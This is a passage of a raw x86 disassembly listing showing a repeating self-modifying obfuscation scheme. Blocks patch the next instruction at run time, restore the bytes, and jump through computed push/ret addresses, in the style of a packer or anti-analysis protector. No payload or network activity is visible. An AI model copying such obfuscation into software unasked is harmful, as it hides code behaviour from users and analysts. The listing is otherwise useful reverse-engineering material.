  408330:	ff 50 66             	call   *0x66(%eax)
  408333:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408338:	05 2b 83 40 00       	add    $0x40832b,%eax
  40833d:	b8 49 95 6d 1e       	mov    $0x1e6d9549,%eax
  408342:	8d 40 01             	lea    0x1(%eax),%eax
  408345:	87 04 24             	xchg   %eax,(%esp)
  408348:	c3                   	ret
  408349:	8f 05 78 83 40 00    	pop    0x408378
  40834f:	50                   	push   %eax
  408350:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408356:	8d 80 76 95 94 fd    	lea    -0x26b6a8a(%eax),%eax
  40835c:	87 05 65 83 40 00    	xchg   %eax,0x408365
  408362:	58                   	pop    %eax
  408363:	f3 90                	pause
  408365:	27                   	daa
  408366:	8f                   	(bad)
  408367:	f2 a5                	repnz movsl %ds:(%esi),%es:(%edi)
  408369:	ff                   	(bad)
  40836a:	ff 50 66             	call   *0x66(%eax)
  40836d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408372:	05 65 83 40 00       	add    $0x408365,%eax
  408377:	b8 5a e6 db dd       	mov    $0xdddbe65a,%eax
  40837c:	8d 40 01             	lea    0x1(%eax),%eax
  40837f:	87 04 24             	xchg   %eax,(%esp)
  408382:	c3                   	ret
  408383:	8f 05 b2 83 40 00    	pop    0x4083b2
  408389:	50                   	push   %eax
  40838a:	90                   	nop
  40838b:	b8 15 20 40 00       	mov    $0x402015,%eax
  408390:	8d 80 ea f5 57 52    	lea    0x5257f5ea(%eax),%eax
  408396:	87 05 9f 83 40 00    	xchg   %eax,0x40839f
  40839c:	58                   	pop    %eax
  40839d:	f3 90                	pause
  40839f:	1b 7d fa             	sbb    -0x6(%ebp),%edi
  4083a2:	83 40 00 50          	addl   $0x50,0x0(%eax)
  4083a6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4083aa:	66 87 05 9f 83 40 00 	xchg   %ax,0x40839f
  4083b1:	b8 37 76 eb e5       	mov    $0xe5eb7637,%eax
  4083b6:	8d 40 01             	lea    0x1(%eax),%eax
  4083b9:	87 04 24             	xchg   %eax,(%esp)
  4083bc:	c3                   	ret
  4083bd:	8f 05 ec 83 40 00    	pop    0x4083ec
  4083c3:	50                   	push   %eax
  4083c4:	90                   	nop
  4083c5:	b8 15 20 40 00       	mov    $0x402015,%eax
  4083ca:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  4083d0:	87 05 d9 83 40 00    	xchg   %eax,0x4083d9
  4083d6:	58                   	pop    %eax
  4083d7:	f3 90                	pause
  4083d9:	a8 0c                	test   $0xc,%al
  4083db:	96                   	xchg   %eax,%esi
  4083dc:	06                   	push   %es
  4083dd:	ff                   	(bad)
  4083de:	ff 50 66             	call   *0x66(%eax)
  4083e1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4083e6:	05 d9 83 40 00       	add    $0x4083d9,%eax
  4083eb:	b8 47 ed 79 8a       	mov    $0x8a79ed47,%eax
  4083f0:	8d 40 01             	lea    0x1(%eax),%eax
  4083f3:	87 04 24             	xchg   %eax,(%esp)
  4083f6:	c3                   	ret
  4083f7:	8f 05 26 84 40 00    	pop    0x408426
  4083fd:	50                   	push   %eax
  4083fe:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408404:	8d 80 ea f5 4f 52    	lea    0x524ff5ea(%eax),%eax
  40840a:	87 05 13 84 40 00    	xchg   %eax,0x408413
  408410:	58                   	pop    %eax
  408411:	f3 90                	pause
  408413:	25 c3 9c 66 40       	and    $0x40669cc3,%eax
  408418:	00 50 66             	add    %dl,0x66(%eax)
  40841b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408420:	05 13 84 40 00       	add    $0x408413,%eax
  408425:	b8 f4 6a 29 f6       	mov    $0xf6296af4,%eax
  40842a:	8d 40 01             	lea    0x1(%eax),%eax
  40842d:	87 04 24             	xchg   %eax,(%esp)
  408430:	c3                   	ret
  408431:	8f 05 60 84 40 00    	pop    0x408460
  408437:	50                   	push   %eax
  408438:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40843e:	8d 80 fa 65 8f ac    	lea    -0x53709a06(%eax),%eax
  408444:	87 05 4d 84 40 00    	xchg   %eax,0x40844d
  40844a:	58                   	pop    %eax
  40844b:	f3 90                	pause
  40844d:	89 1a                	mov    %ebx,(%edx)
  40844f:	fd                   	std
  408450:	43                   	inc    %ebx
  408451:	ff                   	(bad)
  408452:	ff 50 66             	call   *0x66(%eax)
  408455:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40845a:	05 4d 84 40 00       	add    $0x40844d,%eax
  40845f:	b8 a9 52 46 4c       	mov    $0x4c4652a9,%eax
  408464:	8d 40 01             	lea    0x1(%eax),%eax
  408467:	87 04 24             	xchg   %eax,(%esp)
  40846a:	c3                   	ret
  40846b:	8f 05 9a 84 40 00    	pop    0x40849a
  408471:	50                   	push   %eax
  408472:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408478:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40847e:	87 05 87 84 40 00    	xchg   %eax,0x408487
  408484:	58                   	pop    %eax
  408485:	f3 90                	pause
  408487:	9e                   	sahf
  408488:	7e f6                	jle    0x408480
  40848a:	b6 ff                	mov    $0xff,%dh
  40848c:	ff 50 66             	call   *0x66(%eax)
  40848f:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408494:	05 87 84 40 00       	add    $0x408487,%eax
  408499:	b8 ef 6e 39 74       	mov    $0x74396eef,%eax
  40849e:	8d 40 01             	lea    0x1(%eax),%eax
  4084a1:	87 04 24             	xchg   %eax,(%esp)
  4084a4:	c3                   	ret
  4084a5:	8f 05 d3 84 40 00    	pop    0x4084d3
  4084ab:	50                   	push   %eax
  4084ac:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4084b2:	8d 80 53 f4 ff 3f    	lea    0x3ffff453(%eax),%eax
  4084b8:	87 05 c1 84 40 00    	xchg   %eax,0x4084c1
  4084be:	58                   	pop    %eax
  4084bf:	f3 90                	pause
  4084c1:	d5 a1                	aad    $0xa1
  4084c3:	26 8b 00             	mov    %es:(%eax),%eax
  4084c6:	50                   	push   %eax
  4084c7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4084cb:	66 87 05 c1 84 40 00 	xchg   %ax,0x4084c1
  4084d2:	b8 28 d0 db 5f       	mov    $0x5fdbd028,%eax
  4084d7:	87 04 24             	xchg   %eax,(%esp)
  4084da:	c3                   	ret
  4084db:	8f 05 09 85 40 00    	pop    0x408509
  4084e1:	50                   	push   %eax
  4084e2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4084e8:	8d 80 d3 6a 74 ff    	lea    -0x8b952d(%eax),%eax
  4084ee:	87 05 f7 84 40 00    	xchg   %eax,0x4084f7
  4084f4:	58                   	pop    %eax
  4084f5:	f3 90                	pause
  4084f7:	10 d4                	adc    %dl,%ah
  4084f9:	5f                   	pop    %edi
  4084fa:	e4 ff                	in     $0xff,%al
  4084fc:	50                   	push   %eax
  4084fd:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408501:	66 87 05 f7 84 40 00 	xchg   %ax,0x4084f7
  408508:	b8 70 b3 86 eb       	mov    $0xeb86b370,%eax
  40850d:	87 04 24             	xchg   %eax,(%esp)
  408510:	c3                   	ret
  408511:	8f 05 40 85 40 00    	pop    0x408540
  408517:	50                   	push   %eax
  408518:	90                   	nop
  408519:	b8 15 20 40 00       	mov    $0x402015,%eax
  40851e:	8d 80 ea 05 e0 51    	lea    0x51e005ea(%eax),%eax
  408524:	87 05 2d 85 40 00    	xchg   %eax,0x40852d
  40852a:	58                   	pop    %eax
  40852b:	f3 90                	pause
  40852d:	9f                   	lahf
  40852e:	63 3d f1 40 00 50    	arpl   %edi,0x500040f1
  408534:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408538:	66 87 05 2d 85 40 00 	xchg   %ax,0x40852d
  40853f:	b8 40 fc c3 2d       	mov    $0x2dc3fc40,%eax
  408544:	8d 40 01             	lea    0x1(%eax),%eax
  408547:	87 04 24             	xchg   %eax,(%esp)
  40854a:	c3                   	ret
  40854b:	8f 05 79 85 40 00    	pop    0x408579
  408551:	50                   	push   %eax
  408552:	90                   	nop
  408553:	b8 15 20 40 00       	mov    $0x402015,%eax
  408558:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40855e:	87 05 67 85 40 00    	xchg   %eax,0x408567
  408564:	58                   	pop    %eax
  408565:	f3 90                	pause
  408567:	81 cb ee f2 00 50    	or     $0x5000f2ee,%ebx
  40856d:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408571:	66 87 05 67 85 40 00 	xchg   %ax,0x408567
  408578:	b8 10 6b e7 3f       	mov    $0x3fe76b10,%eax
  40857d:	87 04 24             	xchg   %eax,(%esp)
  408580:	c3                   	ret
  408581:	8f 05 af 85 40 00    	pop    0x4085af
  408587:	50                   	push   %eax
  408588:	90                   	nop
  408589:	b8 15 20 40 00       	mov    $0x402015,%eax
  40858e:	8d 80 a5 2a 10 40    	lea    0x40102aa5(%eax),%eax
  408594:	87 05 9d 85 40 00    	xchg   %eax,0x40859d
  40859a:	58                   	pop    %eax
  40859b:	f3 90                	pause
  40859d:	77 8c                	ja     0x40852b
  40859f:	8d                   	lea    (bad),%edi
  4085a0:	ff 00                	incl   (%eax)
  4085a2:	50                   	push   %eax
  4085a3:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4085a7:	66 87 05 9d 85 40 00 	xchg   %ax,0x40859d
  4085ae:	b8 b9 83 32 32       	mov    $0x323283b9,%eax
  4085b3:	87 04 24             	xchg   %eax,(%esp)
  4085b6:	c3                   	ret
  4085b7:	8f 05 e6 85 40 00    	pop    0x4085e6
  4085bd:	50                   	push   %eax
  4085be:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4085c4:	8d 80 78 ed 87 56    	lea    0x5687ed78(%eax),%eax
  4085ca:	87 05 d3 85 40 00    	xchg   %eax,0x4085d3
  4085d0:	58                   	pop    %eax
  4085d1:	f3 90                	pause
  4085d3:	ad                   	lods   %ds:(%esi),%eax
  4085d4:	e1 2f                	loope  0x408605
  4085d6:	b5 40                	mov    $0x40,%ch
  4085d8:	00 50 66             	add    %dl,0x66(%eax)
  4085db:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4085e0:	05 d3 85 40 00       	add    $0x4085d3,%eax
  4085e5:	b8 bd f3 f0 4c       	mov    $0x4cf0f3bd,%eax
  4085ea:	8d 40 01             	lea    0x1(%eax),%eax
  4085ed:	87 04 24             	xchg   %eax,(%esp)
  4085f0:	c3                   	ret
  4085f1:	8f 05 1f 86 40 00    	pop    0x40861f
  4085f7:	50                   	push   %eax
  4085f8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4085fe:	8d 80 d3 d6 59 ff    	lea    -0xa6292d(%eax),%eax
  408604:	87 05 0d 86 40 00    	xchg   %eax,0x40860d
  40860a:	58                   	pop    %eax
  40860b:	f3 90                	pause
  40860d:	94                   	xchg   %eax,%esp
  40860e:	bb a3 3f ff 50       	mov    $0x50ff3fa3,%ebx
  408613:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408617:	66 87 05 0d 86 40 00 	xchg   %ax,0x40860d
  40861e:	b8 fb ab 25 8a       	mov    $0x8a25abfb,%eax
  408623:	87 04 24             	xchg   %eax,(%esp)
  408626:	c3                   	ret
  408627:	8f 05 55 86 40 00    	pop    0x408655
  40862d:	50                   	push   %eax
  40862e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408634:	8d 80 d3 34 4e ff    	lea    -0xb1cb2d(%eax),%eax
  40863a:	87 05 43 86 40 00    	xchg   %eax,0x408643
  408640:	58                   	pop    %eax
  408641:	f3 90                	pause
  408643:	c8 e0 2f e9          	enter  $0x2fe0,$0xe9
  408647:	ff 50 66             	call   *0x66(%eax)
  40864a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40864f:	05 43 86 40 00       	add    $0x408643,%eax
  408654:	b8 5e d6 e6 bf       	mov    $0xbfe6d65e,%eax
  408659:	87 04 24             	xchg   %eax,(%esp)
  40865c:	c3                   	ret
  40865d:	8f 05 8b 86 40 00    	pop    0x40868b
  408663:	50                   	push   %eax
  408664:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40866a:	8d 80 a5 f1 bf ff    	lea    -0x400e5b(%eax),%eax
  408670:	87 05 79 86 40 00    	xchg   %eax,0x408679
  408676:	58                   	pop    %eax
  408677:	f3 90                	pause
  408679:	5c                   	pop    %esp
  40867a:	f1                   	int1
  40867b:	44                   	inc    %esp
  40867c:	c5 00                	lds    (%eax),%eax
  40867e:	50                   	push   %eax
  40867f:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408683:	66 87 05 79 86 40 00 	xchg   %ax,0x408679
  40868a:	b8 f6 b5 03 2e       	mov    $0x2e03b5f6,%eax
  40868f:	87 04 24             	xchg   %eax,(%esp)
  408692:	c3                   	ret
  408693:	8f 05 c3 86 40 00    	pop    0x4086c3
  408699:	50                   	push   %eax
  40869a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4086a0:	8d 80 b2 e4 e3 ff    	lea    -0x1c1b4e(%eax),%eax
  4086a6:	87 05 af 86 40 00    	xchg   %eax,0x4086af
  4086ac:	58                   	pop    %eax
  4086ad:	f3 90                	pause
  4086af:	3b f7                	cmp    %edi,%esi
  4086b1:	cc                   	int3
  4086b2:	df 00                	filds  (%eax)
  4086b4:	00 00                	add    %al,(%eax)
  4086b6:	50                   	push   %eax
  4086b7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4086bb:	66 87 05 af 86 40 00 	xchg   %ax,0x4086af
  4086c2:	b8 ca 51 65 e0       	mov    $0xe06551ca,%eax
  4086c7:	8d 40 02             	lea    0x2(%eax),%eax
  4086ca:	87 04 24             	xchg   %eax,(%esp)
  4086cd:	c3                   	ret
  4086ce:	8f 05 fc 86 40 00    	pop    0x4086fc
  4086d4:	50                   	push   %eax
  4086d5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4086db:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  4086e1:	87 05 ea 86 40 00    	xchg   %eax,0x4086ea
  4086e7:	58                   	pop    %eax
  4086e8:	f3 90                	pause
  4086ea:	af                   	scas   %es:(%edi),%eax
  4086eb:	3c b8                	cmp    $0xb8,%al
  4086ed:	0b 00                	or     (%eax),%eax
  4086ef:	50                   	push   %eax
  4086f0:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4086f4:	66 87 05 ea 86 40 00 	xchg   %ax,0x4086ea
  4086fb:	b8 e8 a8 ec c7       	mov    $0xc7eca8e8,%eax
  408700:	87 04 24             	xchg   %eax,(%esp)
  408703:	c3                   	ret
  408704:	8f 05 33 87 40 00    	pop    0x408733
  40870a:	50                   	push   %eax
  40870b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408711:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  408717:	87 05 20 87 40 00    	xchg   %eax,0x408720
  40871d:	58                   	pop    %eax
  40871e:	f3 90                	pause
  408720:	5d                   	pop    %ebp
  408721:	23 b7 79 40 00 50    	and    0x50004079(%edi),%esi
  408727:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40872b:	66 87 05 20 87 40 00 	xchg   %ax,0x408720
  408732:	b8 29 3a b7 65       	mov    $0x65b73a29,%eax
  408737:	8d 40 01             	lea    0x1(%eax),%eax
  40873a:	87 04 24             	xchg   %eax,(%esp)
  40873d:	c3                   	ret
  40873e:	8f 05 6c 87 40 00    	pop    0x40876c
  408744:	50                   	push   %eax
  408745:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40874b:	8d 80 d3 9a 62 ff    	lea    -0x9d652d(%eax),%eax
  408751:	87 05 5a 87 40 00    	xchg   %eax,0x40875a
  408757:	58                   	pop    %eax
  408758:	f3 90                	pause
  40875a:	52                   	push   %edx
  40875b:	1f                   	pop    %ds
  40875c:	db af ff 50 66 b8    	fldt   -0x4799af01(%edi)
  408762:	eb e8                	jmp    0x40874c
  408764:	66 87 05 5a 87 40 00 	xchg   %ax,0x40875a
  40876b:	b8 e5 3a cd ce       	mov    $0xcecd3ae5,%eax
  408770:	87 04 24             	xchg   %eax,(%esp)
  408773:	c3                   	ret
  408774:	8f 05 a2 87 40 00    	pop    0x4087a2
  40877a:	50                   	push   %eax
  40877b:	90                   	nop
  40877c:	b8 15 20 40 00       	mov    $0x402015,%eax
  408781:	8d 80 a6 e4 c0 ff    	lea    -0x3f1b5a(%eax),%eax
  408787:	87 05 90 87 40 00    	xchg   %eax,0x408790
  40878d:	58                   	pop    %eax
  40878e:	f3 90                	pause
  408790:	b4 c9                	mov    $0xc9,%ah
  408792:	3b 06                	cmp    (%esi),%eax
  408794:	00 50 66             	add    %dl,0x66(%eax)
  408797:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40879c:	05 90 87 40 00       	add    $0x408790,%eax
  4087a1:	b8 c8 69 87 5f       	mov    $0x5f8769c8,%eax
  4087a6:	87 04 24             	xchg   %eax,(%esp)
  4087a9:	c3                   	ret
  4087aa:	8f 05 d8 87 40 00    	pop    0x4087d8
  4087b0:	50                   	push   %eax
  4087b1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4087b7:	8d 80 d3 85 70 ff    	lea    -0x8f7a2d(%eax),%eax
  4087bd:	87 05 c6 87 40 00    	xchg   %eax,0x4087c6
  4087c3:	58                   	pop    %eax
  4087c4:	f3 90                	pause
  4087c6:	0d 67 eb d7 ff       	or     $0xffd7eb67,%eax
  4087cb:	50                   	push   %eax
  4087cc:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4087d0:	66 87 05 c6 87 40 00 	xchg   %ax,0x4087c6
  4087d7:	b8 b2 3a ed 20       	mov    $0x20ed3ab2,%eax
  4087dc:	87 04 24             	xchg   %eax,(%esp)
  4087df:	c3                   	ret
  4087e0:	8f 05 0e 88 40 00    	pop    0x40880e
  4087e6:	50                   	push   %eax
  4087e7:	90                   	nop
  4087e8:	b8 15 20 40 00       	mov    $0x402015,%eax
  4087ed:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  4087f3:	87 05 fc 87 40 00    	xchg   %eax,0x4087fc
  4087f9:	58                   	pop    %eax
  4087fa:	f3 90                	pause
  4087fc:	c3                   	ret
  4087fd:	49                   	dec    %ecx
  4087fe:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4087ff:	2e 00 50 66          	add    %dl,%cs:0x66(%eax)
  408803:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408808:	05 fc 87 40 00       	add    $0x4087fc,%eax
  40880d:	b8 54 ce 2c 21       	mov    $0x212cce54,%eax
  408812:	87 04 24             	xchg   %eax,(%esp)
  408815:	c3                   	ret
  408816:	8f 05 45 88 40 00    	pop    0x408845
  40881c:	50                   	push   %eax
  40881d:	90                   	nop
  40881e:	b8 15 20 40 00       	mov    $0x402015,%eax
  408823:	8d 80 76 ed 63 57    	lea    0x5763ed76(%eax),%eax
  408829:	87 05 32 88 40 00    	xchg   %eax,0x408832
  40882f:	58                   	pop    %eax
  408830:	f3 90                	pause
  408832:	59                   	pop    %ecx
  408833:	c9                   	leave
  408834:	e5 b8                	in     $0xb8,%eax
  408836:	40                   	inc    %eax
  408837:	00 50 66             	add    %dl,0x66(%eax)
  40883a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40883f:	05 32 88 40 00       	add    $0x408832,%eax
  408844:	b8 65 4b 2a 4c       	mov    $0x4c2a4b65,%eax
  408849:	8d 40 01             	lea    0x1(%eax),%eax
  40884c:	87 04 24             	xchg   %eax,(%esp)
  40884f:	c3                   	ret
  408850:	8f 05 7e 88 40 00    	pop    0x40887e
  408856:	50                   	push   %eax
  408857:	90                   	nop
  408858:	b8 15 20 40 00       	mov    $0x402015,%eax
  40885d:	8d 80 8c 54 10 40    	lea    0x4010548c(%eax),%eax
  408863:	87 05 6c 88 40 00    	xchg   %eax,0x40886c
  408869:	58                   	pop    %eax
  40886a:	f3 90                	pause
  40886c:	dc be 99 b1 00 50    	fdivrl 0x5000b199(%esi)
  408872:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408876:	66 87 05 6c 88 40 00 	xchg   %ax,0x40886c
  40887d:	b8 89 64 5f ff       	mov    $0xff5f6489,%eax
  408882:	87 04 24             	xchg   %eax,(%esp)
  408885:	c3                   	ret
  408886:	8f 05 b5 88 40 00    	pop    0x4088b5
  40888c:	50                   	push   %eax
  40888d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408893:	8d 80 74 ed 33 57    	lea    0x5733ed74(%eax),%eax
  408899:	87 05 a2 88 40 00    	xchg   %eax,0x4088a2
  40889f:	58                   	pop    %eax
  4088a0:	f3 90                	pause
  4088a2:	1d 1e 8f 0d 40       	sbb    $0x400d8f1e,%eax
  4088a7:	00 50 66             	add    %dl,0x66(%eax)
  4088aa:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4088af:	05 a2 88 40 00       	add    $0x4088a2,%eax
  4088b4:	b8 dc b5 0e 81       	mov    $0x810eb5dc,%eax
  4088b9:	8d 40 01             	lea    0x1(%eax),%eax
  4088bc:	87 04 24             	xchg   %eax,(%esp)
  4088bf:	c3                   	ret
  4088c0:	8f 05 ef 88 40 00    	pop    0x4088ef
  4088c6:	50                   	push   %eax
  4088c7:	90                   	nop
  4088c8:	b8 15 20 40 00       	mov    $0x402015,%eax
  4088cd:	8d 80 6c a2 c0 3f    	lea    0x3fc0a26c(%eax),%eax
  4088d3:	87 05 dc 88 40 00    	xchg   %eax,0x4088dc
  4088d9:	58                   	pop    %eax
  4088da:	f3 90                	pause
  4088dc:	be 8b 08 53 00       	mov    $0x53088b,%esi
  4088e1:	00 50 66             	add    %dl,0x66(%eax)
  4088e4:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4088e9:	05 dc 88 40 00       	add    $0x4088dc,%eax
  4088ee:	b8 a5 69 79 a5       	mov    $0xa57969a5,%eax
  4088f3:	8d 40 01             	lea    0x1(%eax),%eax
  4088f6:	87 04 24             	xchg   %eax,(%esp)
  4088f9:	c3                   	ret
  4088fa:	8f 05 29 89 40 00    	pop    0x408929
  408900:	50                   	push   %eax
  408901:	90                   	nop
  408902:	b8 15 20 40 00       	mov    $0x402015,%eax
  408907:	8d 80 74 f5 63 57    	lea    0x5763f574(%eax),%eax
  40890d:	87 05 16 89 40 00    	xchg   %eax,0x408916
  408913:	58                   	pop    %eax
  408914:	f3 90                	pause
  408916:	25 5e 64 f0 40       	and    $0x40f0645e,%eax
  40891b:	00 50 66             	add    %dl,0x66(%eax)
  40891e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408923:	05 16 89 40 00       	add    $0x408916,%eax
  408928:	b8 eb ed da ea       	mov    $0xeadaedeb,%eax
  40892d:	8d 40 01             	lea    0x1(%eax),%eax
  408930:	87 04 24             	xchg   %eax,(%esp)
  408933:	c3                   	ret
  408934:	8f 05 62 89 40 00    	pop    0x408962
  40893a:	50                   	push   %eax
  40893b:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408941:	8d 80 8c 84 17 40    	lea    0x4017848c(%eax),%eax
  408947:	87 05 50 89 40 00    	xchg   %eax,0x408950
  40894d:	58                   	pop    %eax
  40894e:	f3 90                	pause
  408950:	0e                   	push   %cs
  408951:	4d                   	dec    %ebp
  408952:	ce                   	into
  408953:	7e 00                	jle    0x408955
  408955:	50                   	push   %eax
  408956:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40895a:	66 87 05 50 89 40 00 	xchg   %ax,0x408950
  408961:	b8 eb 16 15 88       	mov    $0x881516eb,%eax
  408966:	87 04 24             	xchg   %eax,(%esp)
  408969:	c3                   	ret
  40896a:	8f 05 99 89 40 00    	pop    0x408999
  408970:	50                   	push   %eax
  408971:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408977:	8d 80 76 ed 33 50    	lea    0x5033ed76(%eax),%eax
  40897d:	87 05 86 89 40 00    	xchg   %eax,0x408986
  408983:	58                   	pop    %eax
  408984:	f3 90                	pause
  408986:	d9 46 51             	flds   0x51(%esi)
  408989:	2e 40                	cs inc %eax
  40898b:	00 50 66             	add    %dl,0x66(%eax)
  40898e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408993:	05 86 89 40 00       	add    $0x408986,%eax
  408998:	b8 03 27 53 f3       	mov    $0xf3532703,%eax
  40899d:	8d 40 01             	lea    0x1(%eax),%eax
  4089a0:	87 04 24             	xchg   %eax,(%esp)
  4089a3:	c3                   	ret
  4089a4:	8f 05 d3 89 40 00    	pop    0x4089d3
  4089aa:	50                   	push   %eax
  4089ab:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4089b1:	8d 80 76 f5 5f 57    	lea    0x575ff576(%eax),%eax
  4089b7:	87 05 c0 89 40 00    	xchg   %eax,0x4089c0
  4089bd:	58                   	pop    %eax
  4089be:	f3 90                	pause
  4089c0:	ba b4 42 58 40       	mov    $0x405842b4,%edx
  4089c5:	00 50 66             	add    %dl,0x66(%eax)
  4089c8:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4089cd:	05 c0 89 40 00       	add    $0x4089c0,%eax
  4089d2:	b8 d0 df 39 c8       	mov    $0xc839dfd0,%eax
  4089d7:	8d 40 01             	lea    0x1(%eax),%eax
  4089da:	87 04 24             	xchg   %eax,(%esp)
  4089dd:	c3                   	ret
  4089de:	8f 05 0d 8a 40 00    	pop    0x408a0d
  4089e4:	50                   	push   %eax
  4089e5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4089eb:	8d 80 ea f5 6f 52    	lea    0x526ff5ea(%eax),%eax
  4089f1:	87 05 fa 89 40 00    	xchg   %eax,0x4089fa
  4089f7:	58                   	pop    %eax
  4089f8:	f3 90                	pause
  4089fa:	16                   	push   %ss
  4089fb:	db ca                	fcmovne %st(2),%st
  4089fd:	b5 40                	mov    $0x40,%ch
  4089ff:	00 50 66             	add    %dl,0x66(%eax)
  408a02:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408a07:	05 fa 89 40 00       	add    $0x4089fa,%eax
  408a0c:	b8 97 41 a3 cb       	mov    $0xcba34197,%eax
  408a11:	8d 40 01             	lea    0x1(%eax),%eax
  408a14:	87 04 24             	xchg   %eax,(%esp)
  408a17:	c3                   	ret
  408a18:	8f 05 46 8a 40 00    	pop    0x408a46
  408a1e:	50                   	push   %eax
  408a1f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408a25:	8d 80 8e 54 10 40    	lea    0x4010548e(%eax),%eax
  408a2b:	87 05 34 8a 40 00    	xchg   %eax,0x408a34
  408a31:	58                   	pop    %eax
  408a32:	f3 90                	pause
  408a34:	ef                   	out    %eax,(%dx)
  408a35:	c2 b9 32             	ret    $0x32b9
  408a38:	00 50 66             	add    %dl,0x66(%eax)
  408a3b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408a40:	05 34 8a 40 00       	add    $0x408a34,%eax
  408a45:	b8 86 7b cc fc       	mov    $0xfccc7b86,%eax
  408a4a:	87 04 24             	xchg   %eax,(%esp)
  408a4d:	c3                   	ret
  408a4e:	8f 05 7d 8a 40 00    	pop    0x408a7d
  408a54:	50                   	push   %eax
  408a55:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408a5b:	8d 80 ea 15 7c 56    	lea    0x567c15ea(%eax),%eax
  408a61:	87 05 6a 8a 40 00    	xchg   %eax,0x408a6a
  408a67:	58                   	pop    %eax
  408a68:	f3 90                	pause
  408a6a:	c6                   	(bad)
  408a6b:	e2 e5                	loop   0x408a52
  408a6d:	85 40 00             	test   %eax,0x0(%eax)
  408a70:	50                   	push   %eax
  408a71:	66 b8 eb e8          	mov    $0xe8eb,%ax
  408a75:	66 87 05 6a 8a 40 00 	xchg   %ax,0x408a6a
  408a7c:	b8 99 21 c6 cd       	mov    $0xcdc62199,%eax
  408a81:	8d 40 01             	lea    0x1(%eax),%eax
  408a84:	87 04 24             	xchg   %eax,(%esp)
  408a87:	c3                   	ret
  408a88:	8f 05 b7 8a 40 00    	pop    0x408ab7
  408a8e:	50                   	push   %eax
  408a8f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408a95:	8d 80 ea f5 27 52    	lea    0x5227f5ea(%eax),%eax
  408a9b:	87 05 a4 8a 40 00    	xchg   %eax,0x408aa4
  408aa1:	58                   	pop    %eax
  408aa2:	f3 90                	pause
  408aa4:	55                   	push   %ebp
  408aa5:	3f                   	aas
  408aa6:	e2 c3                	loop   0x408a6b
  408aa8:	40                   	inc    %eax
  408aa9:	00 50 66             	add    %dl,0x66(%eax)
  408aac:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  408ab1:	05 a4 8a 40 00       	add    $0x408aa4,%eax
  408ab6:	b8 ac f4 54 7e       	mov    $0x7e54f4ac,%eax
  408abb:	8d 40 01             	lea    0x1(%eax),%eax
  408abe:	87 04 24             	xchg   %eax,(%esp)
  408ac1:	c3                   	ret
  408ac2:	8f 05 f0 8a 40 00    	pop    0x408af0
  408ac8:	50                   	push   %eax
  408ac9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  408acf:	8d 80 53 e4 ff 3f    	lea    0x3fffe453(%eax),%eax
  408ad5:	87 05 de 8a 40 00    	xchg   %eax,0x408ade
  408adb:	58                   	pop    %eax
  408adc:	f3 90                	pause
  408ade:	c2 da dd             	ret    $0xddda
  408ae1:	20 00                	and    %al,(%eax)
  408ae3:	50                   	push   %eax
  408ae4:	66 b8 eb e8          	mov    $0xe8eb,%ax
